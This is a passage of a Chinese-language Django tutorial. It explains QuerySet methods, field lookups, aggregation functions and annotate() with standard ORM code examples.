[datetime.date(2005, 3, 20), datetime.date(2005, 2, 20)]
>>> Entry.objects.filter(headline__contains='Lennon').dates('pub_date', 'day')
[datetime.date(2005, 3, 20)]

</pre><textarea>
# 获取日期归档对应的博客数量
    blog_dates = Blog.objects.dates('created_time', 'month', order="DESC")
    print(blog_dates) # < QuerySet [datetime.date(2018, 1, 1), datetime.date(2017, 12, 1)]>
    print(blog_dates[0]) # 2018-01-01
    blog_dates_dict = {}
    for blog_date in blog_dates:
        blog_count = Blog.objects.filter(created_time__year=blog_date.year, created_time__month=blog_date.month).count()
        blog_dates_dict[blog_date] = blog_count

</textarea><pre>
10. datetimes()
datetimes(field_name, kind, order='ASC', tzinfo=None)
返回QuerySet,为datetime.datetime对象的列表,表示QuerySet内容中特定种类的所有可用日期。
field_name应为模型的DateTimeField的名称。
kind参数应为"hour","minute","month","year","second"或"day",结果列表中的每个datetime.datetime对象被截取到给定的类型。
order参数默认为'ASC',或者'DESC'。 它指定如何排序结果。
tzinfo参数定义在截取之前将数据时间转换到的时区。

11. none()
调用none()将创建一个不返回任何对象的查询集,并且在访问结果时不会执行任何查询。
>>> Entry.objects.none()
< QuerySet []>
>>> from django.db.models.query import EmptyQuerySet
>>> isinstance(Entry.objects.none(), EmptyQuerySet)
True

12. all()
返回当前QuerySet或QuerySet子类的副本,通常用于获取全部QuerySet对象。

13. union()
union(*other_qs, all=False)
集合中并集,使用SQL的UNION运算符组合两个或更多个QuerySet的结果,默认情况下UNION操作符仅选择不同的值,要允许重复值请使用all=True参数。
>>> qs1.union(qs2, qs3)

14. intersection()
intersection(*other_qs)
集合中交集,使用SQL的INTERSECT运算符返回两个或更多个QuerySet的共有元素
>>> qs1.intersection(qs2, qs3)

15. difference()
difference(*other_qs)
集合中差集,使用SQL的EXCEPT运算符只保留QuerySet中的元素,但不保留其他QuerySet中的元素
>>> qs1.difference(qs2, qs3)

16. select_related()
select_related(*fields)
沿着外键关系查询关联的对象的数据,这会生成一个复杂的查询并引起性能的损耗,但是在以后使用外键关系时将不需要再次数据库查询。

# 一个标准的普通查询
e = Entry.objects.get(id=5) # 访问数据库。
b = e.blog                  # 再次访问数据库以得到关联的Blog对象。

# 一个select_related查询:
e = Entry.objects.select_related('blog').get(id=5) # 访问数据库。
b = e.blog                                         # 不会访问数据库,因为e.blog已经在前面的查询中获得了。

select_related()可用于objects任何的查询集:
from django.utils import timezone
# Find all the blogs with entries scheduled to be published in the future.
blogs = set()
for e in Entry.objects.filter(pub_date__gt=timezone.now()).select_related('blog'):
    # 没有select_related(),下面的语句将为每次循环迭代生成一个数据库查询,以获得每个entry关联的blog。
    blogs.add(e.blog)

filter()和select_related()的顺序不重要,下面的查询集是等同的:
Entry.objects.filter(pub_date__gt=timezone.now()).select_related('blog')
Entry.objects.select_related('blog').filter(pub_date__gt=timezone.now())

可以沿着外键查询,如果有以下模型:
class City(models.Model):
    # ...
    pass

class Person(models.Model):
    # ...
    hometown = models.ForeignKey(City, on_delete=models.SET_NULL, blank=True, null=True)

class Book(models.Model):
    # ...
    author = models.ForeignKey(Person, on_delete=models.CASCADE)

b = Book.objects.select_related('author__hometown').get(id=4)  # 将缓存相关的Person和相关的City
p = b.author         # Doesn't hit the database.
c = p.hometown       # Doesn't hit the database.
b = Book.objects.get(id=4)  # No select_related() in this example.
p = b.author         # Hits the database.
c = p.hometown       # Hits the database.

在传递给select_related()的字段中,可以使用任何ForeignKey和OneToOneField。
在传递给select_related的字段中,还可以反向引用OneToOneField。也就是说可以回溯到定义OneToOneField的字段,此时可以使用关联对象字段的related_name,而不要指定字段的名称。

17. prefetch_related()
prefetch_related(*lookups)
在单个批处理中自动检索每个指定查找的相关对象。
与select_related类似,但是策略是完全不同的。

假设有这些模型:
class Topping(models.Model):
    name = models.CharField(max_length=30)

class Pizza(models.Model):
    name = models.CharField(max_length=50)
    toppings = models.ManyToManyField(Topping)

    def __str__(self):              # __unicode__ on Python 2
        return "%s (%s)" % (self.name, ", ".join(topping.name for topping in self.toppings.all()))

>>> Pizza.objects.all()
["Hawaiian (ham, pineapple)", "Seafood (prawns, smoked salmon)"...
问题是每次QuerySet要求Pizza.objects.all()查询数据库,因此self.toppings.all()将在Pizza Pizza.__str__()中的每个项目的Toppings表上运行查询。

可以使用prefetch_related减少为只有两个查询:
>>> Pizza.objects.all().prefetch_related('toppings')
这意味着现在每次self.toppings.all()被调用,不会再去数据库查找,而是在一个预取的QuerySet缓存中查找。

还可以使用正常连接语法来执行相关字段的相关字段。 假设在上面的例子中增加一个额外的模型:
class Restaurant(models.Model):
    pizzas = models.ManyToManyField(Pizza, related_name='restaurants')
    best_pizza = models.ForeignKey(Pizza, related_name='championed_by')

以下是合法的:
>>> Restaurant.objects.prefetch_related('pizzas__toppings')
这将预取所有属于餐厅的比萨饼,和所有属于那些比萨饼的配料。 这将导致总共3个查询 - 一个用于餐馆,一个用于比萨饼,一个用于配料。

>>> Restaurant.objects.prefetch_related('best_pizza__toppings')
这将获取最好的比萨饼和每个餐厅最好的披萨的所有配料。 这将在3个表中查询 - 一个为餐厅,一个为"最佳比萨饼",一个为一个为配料。

当然也可以使用best_pizza来获取select_related关系,以将查询数减少为2:
>>> Restaurant.objects.select_related('best_pizza').prefetch_related('best_pizza__toppings')

18. extra()
extra(select=None, where=None, params=None, tables=None, order_by=None, select_params=None)
有些情况下Django的查询语法难以简单的表达复杂的WHERE子句,对于这种情况可以在extra()生成的SQL从句中注入新子句。使用这种方法作为最后的手段,这是一个旧的API,在将来的某个时候可能被弃用。仅当无法使用其他查询方法表达查询时才使用它。

>>> qs.extra(select={'val': "select col from sometable where othercol = %s"}, select_params=(someparam,))
相当于:
>>> qs.annotate(val=RawSQL("select col from sometable where othercol = %s", (someparam,)))

19. defer()
defer(*fields)
在一些复杂的数据建模情况下,模型可能包含大量字段,其中一些可能包含大尺寸数据如文本字段,将它们转换为Python对象需要花费很大的代价。
当最初获取数据时不知道是否需要这些特定字段的情况下,如果正在使用查询集的结果,可以告诉Django不要从数据库中检索它们。
通过传递字段名称到defer()实现不加载:
Entry.objects.defer("headline", "body")
具有延迟加载字段的查询集仍将返回模型实例。

每个延迟字段将在访问该字段时从数据库中检索,每次只检索一个,而不是一次检索所有的延迟字段

可以多次调用defer(),每个调用都向延迟集添加新字段:
# 延迟body和headline两个字段。
Entry.objects.defer("body").filter(rating=5).defer("headline")

字段添加到延迟集的顺序无关紧要。对已经延迟的字段名称再次defer()没有问题(该字段仍将被延迟)。

可以使用标准的双下划线符号来分隔关联的字段,从而加载关联模型中的字段:
Blog.objects.select_related().defer("entry__headline", "entry__body")

如果要清除延迟字段集,将None作为参数传递到defer():
my_queryset.defer(None) # 立即加载所有的字段

defer()方法及其兄弟only()仅适用于高级用例,它们提供了数据加载的优化方法。

20. only()
only(*fields)
only()方法与defer()相反,如果有一个模型几乎所有的字段需要延迟,使用only()指定补充的字段集可以使代码更简单。
假设有一个包含字段biography、age和name的模型。 以下两个查询集是相同的,就延迟字段而言:
Person.objects.defer("age", "biography")
Person.objects.only("name")

每当调用only()时它将替换立即加载的字段集,因此对only()的连续调用的结果是只有最后一次调用的字段被考虑:
# This will defer all fields except the headline.
Entry.objects.only("body", "rating").only("headline")

由于defer()以递增方式动作(向延迟列表中添加字段),因此可以结合only()和defer()调用:
# Final result is that everything except "headline" is deferred.
Entry.objects.only("headline", "body").defer("body")
# Final result loads headline and body immediately (only() replaces any
# existing set of fields).
Entry.objects.defer("body").only("headline", "body")
当对具有延迟字段的实例调用save()时,仅保存加载的字段。

21. using()
using(alias)
如果正在使用多个数据库,这个方法用于指定在哪个数据库上查询QuerySet。方法的唯一参数是数据库的别名,定义在DATABASES。
>>> Entry.objects.all()  # queries the database with the 'default' alias
>>> Entry.objects.using('backup') # queries the database with the 'backup' alias

22. select_for_update()
select_for_update(nowait=False, skip_locked=False)
返回一个锁住行直到事务结束的查询集,如果数据库支持它将生成一个SELECT ... FOR UPDATE语句。
entries = Entry.objects.select_for_update().filter(author=request.user)
所有匹配的行将被锁定,直到事务结束,这意味着可以通过锁防止数据被其它事务修改。

一般情况下如果其他事务锁定了相关行,那么本查询将被阻塞直到锁被释放。使用select_for_update(nowait=True)将使查询不阻塞。如果其它事务持有冲突的锁,那么查询将引发DatabaseError异常。也可以使用select_for_update(skip_locked=True)忽略锁定的行。nowait和skip_locked是互斥的。

目前postgresql,oracle和mysql数据库后端支持select_for_update(),但MySQL不支持nowait和skip_locked参数。

23. raw()
raw(raw_query, params=None, translations=None)
接收一个原始的SQL查询,执行它并返回一个django.db.models.query.RawQuerySet实例。
这个RawQuerySet实例可以迭代,就像普通的QuerySet一样。

</pre>

<h4>不返回QuerySets的API</h4><pre>
get()   获取单个对象
create()    创建对象,无需save()
get_or_create() 查询对象,如果没有找到就新建对象
update_or_create()  更新对象,如果没有找到就创建对象
bulk_create()   批量创建对象
count() 统计对象的个数
in_bulk()   根据主键值的列表,批量返回对象
iterator()  获取包含对象的迭代器
latest()    获取最近的对象
earliest()  获取最早的对象
first() 获取第一个对象
last()  获取最后一个对象
aggregate() 聚合操作
exists()    判断queryset中是否有对象
update()    批量更新对象
delete()    批量删除对象
as_manager()    获取管理器

1. get()
get(**kwargs)
返回按照查询参数匹配到的单个对象,参数的格式应符合Field lookups要求
如果匹配到的对象不只一个则触发MultipleObjectsReturned异常
如果根据给出的参数匹配不到对象则触发DoesNotExist异常。例如:
Entry.objects.get(id='foo') # raises Entry.DoesNotExist

DoesNotExist异常从django.core.exceptions.ObjectDoesNotExist继承,可以定位多个DoesNotExist异常
from django.core.exceptions import ObjectDoesNotExist
try:
    e = Entry.objects.get(id=3)
    b = Blog.objects.get(id=1)
except ObjectDoesNotExist:
    print("Either the entry or blog doesn't exist.")

如果希望查询器只返回一行则可以使用get()而不使用任何参数来返回该行的对象:
entry = Entry.objects.filter(...).exclude(...).get()

2. create()
create(**kwargs)
在一步操作中同时创建并且保存对象的便捷方法.
p = Person.objects.create(first_name="Bruce", last_name="Springsteen")
等于:
p = Person(first_name="Bruce", last_name="Springsteen")
p.save(force_insert=True)

参数force_insert表示强制创建对象。如果model中有一个手动设置的主键,并且这个值已经存在于数据库中, 调用create()将会失败并触发IntegrityError,因为主键必须是唯一的。如果手动设置了主键则要做好异常处理的准备。

3. get_or_create()
get_or_create(defaults=None, **kwargs)
通过kwargs来查询对象的便捷方法(如果模型中的所有字段都有默认值,可以为空),如果该对象不存在则创建一个新对象。
该方法返回一个由(object, created)组成的元组,元组中的object是一个查询到的或是被创建的对象,created是一个表示是否创建了新的对象的布尔值。

try:
    obj = Person.objects.get(first_name='John', last_name='Lennon')
except Person.DoesNotExist:
    obj = Person(first_name='John', last_name='Lennon', birthday=date(1940, 10, 9))
    obj.save()

如果模型的字段数量较大的话,这种模式就变的非常不易用了,上面的示例可以用get_or_create()重写 :
obj, created = Person.objects.get_or_create(
    first_name='John',
    last_name='Lennon',
    defaults={'birthday': date(1940, 10, 9)},
)

任何传递给get_or_create()的关键字参数,除了一个可选的defaults,都将传递给get()调用。 如果查找到一个对象,返回一个包含匹配到的对象以及False组成的元组。 如果查找到的对象超过一个以上将引发MultipleObjectsReturned。如果查找不到对象,get_or_create()将会实例化并保存一个新的对象,返回一个由新的对象以及True组成的元组。新的对象将会按照以下的逻辑创建:
params = {k: v for k, v in kwargs.items() if '__' not in k}
params.update({k: v() if callable(v) else v for k, v in defaults.items()})
obj = self.model(**params)
obj.save()
它表示从非'defaults' 且不包含双下划线的关键字参数开始。然后将defaults的内容添加进来,覆盖必要的键,并使用结果作为关键字参数传递给模型类。

如果有一个名为defaults__exact的字段,并且想在get_or_create()时用它作为精确查询,只需要使用defaults
Foo.objects.get_or_create(defaults__exact='bar', defaults={'defaults': 'baz'})
当使用手动指定的主键时get_or_create()方法与create()方法有相似的错误行为,如果需要创建一个对象而该对象的主键早已存在于数据库中,IntegrityError异常将会被触发。

这个方法假设进行的是原子操作,并且正确地配置了数据库和正确的底层数据库行为。如果数据库级别没有对get_or_create中用到的kwargs强制要求唯一性(unique和unique_together),方法容易导致竞态条件,可能会有相同参数的多行同时插入,简单理解就是kwargs必须指定的是主键或unique属性的字段才安全

最后建议只在Django视图的POST请求中使用get_or_create(),因为这是一个具有修改性质的动作,不应该使用在GET请求中,那样不安全。

可以通过ManyToManyField属性和反向关联使用get_or_create(),在这种情况下应该限制查询在关联的上下文内部,否则可能导致完整性问题。

class Chapter(models.Model):
    title = models.CharField(max_length=255, unique=True)

class Book(models.Model):
    title = models.CharField(max_length=256)
    chapters = models.ManyToManyField(Chapter)

# 可以通过Book的chapters字段使用get_or_create(),但是它只会获取该Book内部的上下文:
>>> book = Book.objects.create(title="Ulysses")
>>> book.chapters.get_or_create(title="Telemachus")
(< Chapter: Telemachus>, True)
>>> book.chapters.get_or_create(title="Telemachus")
(< Chapter: Telemachus>, False)
>>> Chapter.objects.create(title="Chapter 1")
< Chapter: Chapter 1>
>>> book.chapters.get_or_create(title="Chapter 1")
# Raises IntegrityError
发生这个错误是因为尝试通过Book "Ulysses"获取或创建"Chapter 1",但是它不能,因为它与这个book不关联,但因为title字段是唯一的它仍然不能创建。

4. update_or_create()
update_or_create(defaults=None, **kwargs)
类似前面的get_or_create()。
通过给出的kwargs来更新对象的便捷方法,如果没找到对象则创建一个新的对象。defaults是一个由(field, value)对组成的字典,用于更新对象。defaults中的值可以是可调用对象(也就是说函数等)。
该方法返回一个由(object, created)组成的元组,元组中的object是一个创建的或者是被更新的对象,created是一个标示是否创建了新的对象的布尔值
update_or_create方法尝试通过给出的kwargs 去从数据库中获取匹配的对象。 如果找到匹配的对象,它将会依据defaults 字典给出的值更新字段。

defaults = {'first_name': 'Bob'}
try:
    obj = Person.objects.get(first_name='John', last_name='Lennon')
    for key, value in defaults.items():
        setattr(obj, key, value)
    obj.save()
except Person.DoesNotExist:
    new_values = {'first_name': 'John', 'last_name': 'Lennon'}
    new_values.update(defaults)
    obj = Person(**new_values)
    obj.save()

如果模型的字段数量较大的话,这种模式就变的非常不易用了,上面的示例可以用update_or_create()重写:

obj, created = Person.objects.update_or_create(
    first_name='John', last_name='Lennon',
    defaults={'first_name': 'Bob'},
)

和get_or_create()一样,这个方法也容易导致竞态条件,如果数据库层级没有前置唯一性会让多行同时插入。

5. bulk_create()
bulk_create(objs, batch_size=None)
以高效的方式将提供的对象列表插入到数据库中,通常只有1个查询,无论有多少对象
>>> Entry.objects.bulk_create([Entry(headline='This is a test'), Entry(headline='This is only a test')])

不会调用模型的save()方法,并且不会发送pre_save和post_save信号。
不适用于多表继承场景中的子模型。
如果模型的主键是AutoField,则不会像save()那样检索并设置主键属性,除非数据库后端支持。
不适用于多对多关系。
batch_size参数控制在单个查询中创建的对象数。

6. count()
count()
返回在数据库中对应的QuerySet对象的个数,count()永远不会引发异常。
Entry.objects.count()  # 返回总个数
Entry.objects.filter(headline__contains='Lennon').count()  # 返回包含有'Lennon'的对象的总数

7. in_bulk()
in_bulk(id_list=None)
获取主键值的列表,并返回将每个主键值映射到具有给定ID的对象的实例的字典,如果未提供列表则会返回查询集中的所有对象

>>> Blog.objects.in_bulk([1])
{1: < Blog: Beatles Blog>}
>>> Blog.objects.in_bulk([1, 2])
{1: < Blog: Beatles Blog>, 2: < Blog: Cheddar Talk>}
>>> Blog.objects.in_bulk([])
{}
>>> Blog.objects.in_bulk()
{1: < Blog: Beatles Blog>, 2: < Blog: Cheddar Talk>, 3: < Blog: Django Weblog>}

8. iterator()
iterator()
提交数据库操作,获取QuerySet,并返回一个迭代器。
QuerySet通常会在内部缓存其结果,以便在重复计算时不会导致额外的查询。而iterator()将直接读取结果,不在QuerySet级别执行任何缓存。对于返回大量只需要访问一次的对象的QuerySet,这可以带来更好的性能,显著减少内存使用。
在已经提交了的iterator()上使用QuerySet会强制它再次提交数据库操作,进行重复查询。此外使用iterator()会导致先前的prefetch_related()调用被忽略,因为这两个一起优化没有意义。

9. latest()
latest(field_name=None)
使用日期字段field_name,按日期返回最新对象。
Entry.objects.latest('pub_date')  # 根据Entry的'pub_date'字段返回最新发布的entry
如果模型的Meta指定了get_latest_by则可以将latest()参数留给earliest()或field_name。 默认情况下Django将使用get_latest_by中指定的字段。

earliest()和latest()可能会返回空日期的实例,可能需要过滤掉空值:
Entry.objects.filter(pub_date__isnull=False).latest('pub_date')

10. earliest()
earliest(field_name=None)
类同latest()。

11. first()
first()
返回结果集的第一个对象, 当没有找到时返回None。如果QuerySet没有设置排序则将会自动按主键进行排序
p = Article.objects.order_by('title', 'pub_date').first()
first()是一个简便方法,下面的例子和上面的代码效果是一样:
try:
    p = Article.objects.order_by('title', 'pub_date')[0]
except IndexError:
    p = None

12. last()
last()
工作方式类似first(),只是返回的是查询集中最后一个对象。

13. aggregate()
aggregate(args, *kwargs)
返回汇总值的字典,平均值、总和等,通过QuerySet进行计算。每个参数指定返回的字典中将要包含的值。
使用关键字参数指定的聚合将使用关键字参数的名称作为Annotation的名称,匿名参数的名称将基于聚合函数的名称和模型字段生成。 复杂的聚合不可以使用匿名参数,必须指定一个关键字参数作为别名。

例如想知道Blog Entry的数目:
>>> from django.db.models import Count
>>> q = Blog.objects.aggregate(Count('entry'))
{'entry__count': 16}

通过使用关键字参数来指定聚合函数,可以控制返回的聚合的值的名称:
>>> q = Blog.objects.aggregate(number_of_entries=Count('entry'))
{'number_of_entries': 16}

14. exists()
exists()
如果QuerySet包含任何结果则返回True,否则返回False。
查找具有唯一性字段(例如primary_key)的模型是否在一个QuerySet中的最高效的方法是:
entry = Entry.objects.get(pk=123)
if some_queryset.filter(pk=entry.pk).exists(): print("Entry contained in queryset")
它将比下面的方法快很多,这个方法要求对QuerySet求值并迭代整个QuerySet:
if entry in some_queryset: print("Entry contained in QuerySet")

若要查找一个QuerySet是否包含任何元素:
if some_queryset.exists(): print("There is at least one object in some_queryset")
将快于:
if some_queryset: print("There is at least one object in some_queryset")

15. update()
update(**kwargs)
对指定的字段执行批量更新操作,并返回匹配的行数,如果某些行已具有新值则可能不等于已更新的行数

# 对2010年发布的所有博客条目启用评论
>>> Entry.objects.filter(pub_date__year=2010).update(comments_on=False)

可以同时更新多个字段,例如同时更新comments_on和headline字段:
>>> Entry.objects.filter(pub_date__year=2010).update(comments_on=False, headline='This is old')

update()方法无需save操作。唯一限制是它只能更新模型主表中的列,而不是关联的模型
>>> Entry.objects.update(blog__name='foo') # Won't work!

仍然可以根据相关字段进行过滤:
>>> Entry.objects.filter(blog__id=1).update(comments_on=True)

update()方法返回受影响的行数:
>>> Entry.objects.filter(id=64).update(comments_on=True)  # 1
>>> Entry.objects.filter(slug='nonexistent-slug').update(comments_on=True)  # 0
>>> Entry.objects.filter(pub_date__year=2010).update(comments_on=False)  # 132

如果只是更新一下对象,不需要为对象做别的事情,最有效的方法是调用update(),而不是将模型对象加载到内存中
# 不要这样做:
e = Entry.objects.get(id=10)
e.comments_on = False
e.save()
# 建议如下操作:
Entry.objects.filter(id=10).update(comments_on=False)

用update()还可以防止在加载对象和调用save()之间的短时间内数据库中某些内容可能发生更改的竞争条件。

如果想更新一个具有自定义save()方法的模型的记录,请循环遍历它们并调用save()
for e in Entry.objects.filter(pub_date__year=2010):
    e.comments_on = False
    e.save()

16. delete()
delete()
批量删除QuerySet中的所有对象,并返回删除的对象个数和每个对象类型的删除次数的字典,delete()动作是立即执行的。
不能在QuerySet上调用delete()。

# 删除特定博客中的所有条目:
>>> b = Blog.objects.get(pk=1)
# Delete all the entries belonging to this Blog.
>>> Entry.objects.filter(blog=b).delete()
(4, {'weblog.Entry': 2, 'weblog.Entry_authors': 2})

默认情况下Django的ForeignKey使用SQL约束ON DELETE CASCADE,任何具有指向要删除的对象的外键的对象将与它们一起被删除
>>> blogs = Blog.objects.all()
# This will delete all Blogs and all of their Entry objects.
>>> blogs.delete()
(5, {'weblog.Blog': 1, 'weblog.Entry': 2, 'weblog.Entry_authors': 2})
这种级联的行为可以通过的ForeignKey的on_delete参数自定义
什么时候要改变这种行为呢？比如日志数据,就不能和它关联的主体一并被删除

delete()会为所有已删除的对象(包括级联删除)发出pre_delete和post_delete信号。

17. as_manager()
classmethod as_manager()
一个类方法,返回Manager的实例与QuerySet的方法的副本。

</pre>

<h4>查询参数</h4><pre>
字段查询是指如何指定SQL WHERE子句的内容,它们用作QuerySet的filter(),exclude()和get()方法的关键字参数
默认查找类型为exact

exact   精确匹配
iexact  不区分大小写的精确匹配
contains    包含匹配
icontains   不区分大小写的包含匹配
in  在..之内的匹配
gt  大于
gte 大于等于
lt  小于
lte 小于等于
startswith  从开头匹配
istartswith 不区分大小写从开头匹配
endswith    从结尾处匹配
iendswith   不区分大小写从结尾处匹配
range   范围匹配
date    日期匹配
year    年份
month   月份
day 日期
week    第几周
week_day    周几
time    时间
hour    小时
minute  分钟
second  秒
isnull  判断是否为空
regex   区分大小写的正则匹配
iregex  不区分大小写的正则匹配

1. exact
精确匹配,是默认的查找类型
Entry.objects.get(id__exact=14)
Entry.objects.get(id__exact=None)

2. iexact
不区分大小写的精确匹配。
Blog.objects.get(name__iexact='beatles blog') # 将匹配 'Beatles Blog', 'beatles blog', 'BeAtLes BLoG'等
Blog.objects.get(name__iexact=None)

3. contains
大小写敏感的包含关系匹配。
Entry.objects.get(headline__contains='Lennon') # 将匹配标题'Lennon honored today',但不匹配'lennon honored today'。

4. icontains
不区分大小写的包含关系匹配。
Entry.objects.get(headline__icontains='Lennon')

5. in
在给定的列表里查找。
Entry.objects.filter(id__in=[1, 3, 4])

还可以使用动态查询集,而不是提供文字值列表:
inner_qs = Blog.objects.filter(name__contains='Cheddar')
entries = Entry.objects.filter(blog__in=inner_qs)

或者从values()或values_list()中获取的QuerySet作为比对的对象:
inner_qs = Blog.objects.filter(name__contains='Ch').values('name')
entries = Entry.objects.filter(blog__name__in=inner_qs)

下面的例子将产生一个异常,因为试图提取两个字段的值,但是查询语句只需要一个字段的值:
inner_qs = Blog.objects.filter(name__contains='Ch').values('name', 'id')
entries = Entry.objects.filter(blog__name__in=inner_qs)

6. gt
大于
Entry.objects.filter(id__gt=4)

7. gte
大于或等于

8. lt
小于

9. lte
小于或等于

10. startswith
区分大小写,从开始位置匹配。
Entry.objects.filter(headline__startswith='Lennon')

11. istartswith
不区分大小写,从开始位置匹配。
Entry.objects.filter(headline__istartswith='Lennon')

12. endswith
区分大小写,从结束未知开始匹配。
Entry.objects.filter(headline__endswith='Lennon')

13. iendswith
不区分大小写,从结束未知开始匹配。
Entry.objects.filter(headline__iendswith='Lennon')

14. range
范围测试,包含于之中,过滤具有日期的DateTimeField不会包含最后一天,因为边界被解释为"给定日期的0am"
import datetime
start_date = datetime.date(2005, 1, 1)
end_date = datetime.date(2005, 3, 31)
Entry.objects.filter(pub_date__range=(start_date, end_date))

15. date
进行日期对比。
Entry.objects.filter(pub_date__date=datetime.date(2005, 1, 1))
Entry.objects.filter(pub_date__date__gt=datetime.date(2005, 1, 1))
当USE_TZ为True时,字段将转换为当前时区,然后进行过滤。

16. year
对年份进行匹配。
Entry.objects.filter(pub_date__year=2005)
Entry.objects.filter(pub_date__year__gte=2005)
当USE_TZ为True时,在过滤之前,datetime字段将转换为当前时区。

17. month
对月份进行匹配。取整数1(1月)至12(12月)。
Entry.objects.filter(pub_date__month=12)
Entry.objects.filter(pub_date__month__gte=6)
当USE_TZ为True时,在过滤之前,datetime字段将转换为当前时区。

18. day
对具体到某一天的匹配。
Entry.objects.filter(pub_date__day=3)
Entry.objects.filter(pub_date__day__gte=3)
当USE_TZ为True时,在过滤之前,datetime字段将转换为当前时区。

19. week
Django1.11中的新功能。根据ISO-8601返回周号(1-52或53),即星期一开始的星期,星期四或之前的第一周。
Entry.objects.filter(pub_date__week=52)
Entry.objects.filter(pub_date__week__gte=32, pub_date__week__lte=38)
当USE_TZ为True时,字段将转换为当前时区,然后进行过滤。

20. week_day
进行"星期几"匹配。 取整数值,星期日为1,星期一为2,星期六为7。
Entry.objects.filter(pub_date__week_day=2)
Entry.objects.filter(pub_date__week_day__gte=2)
当USE_TZ为True时,在过滤之前,datetime字段将转换为当前时区。

21. time
将字段的值转为datetime.time格式并进行对比。
Entry.objects.filter(pub_date__time=datetime.time(14, 30))
Entry.objects.filter(pub_date__time__between=(datetime.time(8), datetime.time(17)))
USE_TZ为True时,字段将转换为当前时区,然后进行过滤。

22. hour
对小时进行匹配。 取0和23之间的整数。
Event.objects.filter(timestamp__hour=23)
Event.objects.filter(time__hour=5)
Event.objects.filter(timestamp__hour__gte=12)
当USE_TZ为True时,值将过滤前转换为当前时区。

23. minute
对分钟匹配。取0和59之间的整数。
Event.objects.filter(timestamp__minute=29)
Event.objects.filter(time__minute=46)
Event.objects.filter(timestamp__minute__gte=29)
当USE_TZ为True时,值将被过滤前转换为当前时区。

24. second
对秒数进行匹配。取0和59之间的整数。
Event.objects.filter(timestamp__second=31)
Event.objects.filter(time__second=2)
Event.objects.filter(timestamp__second__gte=31)
当USE_TZ为True时,值将过滤前转换为当前时区。

25. isnull
值为False或True, 相当于SQL语句IS NULL和IS NOT NULL.
Entry.objects.filter(pub_date__isnull=True)

26. regex
区分大小写的正则表达式匹配。
Entry.objects.get(title__regex=r'^(An?|The) +')
建议使用原始字符串(例如,r'foo'而不是'foo')来传递正则表达式语法。

28. iregex
不区分大小写的正则表达式匹配。
Entry.objects.get(title__iregex=r'^(an?|the) +')

</pre>

<h4>聚合函数</h4><pre>
Django的django.db.models模块提供以下聚合函数。

1. expression
引用模型字段的一个字符串或一个query expression。

2. output_field
用来表示返回值的model field,一个可选的参数。

3. **extra
关键字参数可以给聚合函数生成的SQL提供额外的信息。

4. Avg
class Avg(expression, output_field=FloatField(), **extra)
返回给定表达式的平均值,它必须是数值,除非指定不同的output_field。
默认的别名:< field>__avg
返回类型:float或指定任何output_field的类型

5. Count
class Count(expression, distinct=False, **extra)
返回与expression相关的对象的个数。
默认的别名:< field>__count
返回类型:int
有一个可选的参数:distinct。如果distinct=True,Count 将只计算唯一的实例。默认值为False。

6. Max
class Max(expression, output_field=None, **extra)
返回expression的最大值。
默认的别名:< field>__max
返回类型:与输入字段的类型相同,如果提供则为`output_field`类型

7. Min
class Min(expression, output_field=None, **extra)
返回expression的最小值。
默认的别名:< field>__min
返回类型:与输入字段的类型相同,如果提供则为`output_field`类型

8. StdDev
class StdDev(expression, sample=False, **extra)
返回expression的标准差。
默认的别名:< field>__stddev
返回类型:float
有一个可选的参数:sample。默认情况下,返回群体的标准差。如果sample=True,返回样本的标准差。
SQLite 没有直接提供StdDev。

9. Sum
class Sum(expression, output_field=None, **extra)
计算expression的所有值的和。
默认的别名:< field>__sum
返回类型:与输入字段的类型相同,如果提供则为output_field类型

10. Variance
class Variance(expression, sample=False, **extra)
返回expression的方差。
默认的别名:< field>__variance
返回类型:float
有一个可选的参数:sample。
SQLite 没有直接提供Variance。

【 聚合查询 】
</pre><textarea>
from django.db import models

class Author(models.Model):
    name = models.CharField(max_length=100)
    age = models.IntegerField()

class Publisher(models.Model):
    name = models.CharField(max_length=300)

class Book(models.Model):
    name = models.CharField(max_length=300)
    pages = models.IntegerField()
    price = models.DecimalField(max_digits=10, decimal_places=2)
    rating = models.FloatField()
    authors = models.ManyToManyField(Author)
    publisher = models.ForeignKey(Publisher, on_delete=models.CASCADE)
    pubdate = models.DateField()

class Store(models.Model):
    name = models.CharField(max_length=300)
    books = models.ManyToManyField(Book)

### count()
>>> Book.objects.count() # 2452
# Total number of books with publisher=BaloneyPress
>>> Book.objects.filter(publisher__name='BaloneyPress').count() # 73

### aggregate()子句,传递给aggregate()的参数描述了想要计算的聚合值,返回"名称-值"的字典,其中"名称"就是聚合值的标志,"值"就是计算出的聚合结果。"名称"是根据字段名和聚合函数而自动生成的,如果想指定一个聚合值的名称,可以在指定聚合子句的时候提供指定的名称
>>> from django.db.models import Avg,Max,Min,FloatField
# Average price across all books.
>>> Book.objects.all().aggregate(Avg('price'))         # {'price__avg': 34.35}
>>> Book.objects.aggregate(Avg('price'))               # {'price__avg': 34.35}
>>> Book.objects.aggregate(average_price=Avg('price')) # {'average_price': 34.35}
>>> Book.objects.filter(name__startswith="Django").aggregate(Avg('price'))
# Max price across all books.
>>> Book.objects.all().aggregate(Max('price'))  # {'price__max': Decimal('81.20')}
>>> Book.objects.all().aggregate(Min('price'))  # {'price__min': Decimal('12.20')}
>>> Book.objects.aggregate(Avg('price'), Max('price'), Min('price'))
{'price__avg': 34.35, 'price__max': Decimal('81.20'), 'price__min': Decimal('12.99')}

# Difference between the highest priced book and the average price of all books.
>>> Book.objects.aggregate(price_diff=Max('price', output_field=FloatField()) - Avg('price')) # {'price_diff': 46.85}

### annotate()子句用来生成每一个对象汇总,注解,当指定annotate()子句QuerySet中的每一个对象将对指定值进行汇总
# All the following queries involve traversing the Book<->Publisher foreign key relationship backwards.

# Each publisher, each with a count of books as a "num_books" attribute.
>>> from django.db.models import Count
>>> pubs = Publisher.objects.annotate(num_books=Count('book'))
>>> pubs               # < QuerySet [< Publisher: BaloneyPress>, < Publisher: SalamiPress>, ...]>
>>> pubs[0].num_books  # 73

# Each publisher, with a separate count of books with a rating above and below 5
>>> from django.db.models import Q
>>> above_5 = Count('book', filter=Q(book__rating__gt=5))
>>> below_5 = Count('book', filter=Q(book__rating__lte=5))
>>> pubs = Publisher.objects.annotate(below_5=below_5).annotate(above_5=above_5)
>>> pubs[0].above_5  # 23
>>> pubs[0].below_5  # 12

# The top 5 publishers, in order by number of books.
>>> pubs = Publisher.objects.annotate(num_books=Count('book')).order_by('-num_books')[:5]
>>> pubs[0].num_books # 1323

>>> from django.db.models import Avg, Count
>>> Book.objects.filter(name__startswith="Django").annotate(num_authors=Count('authors'))
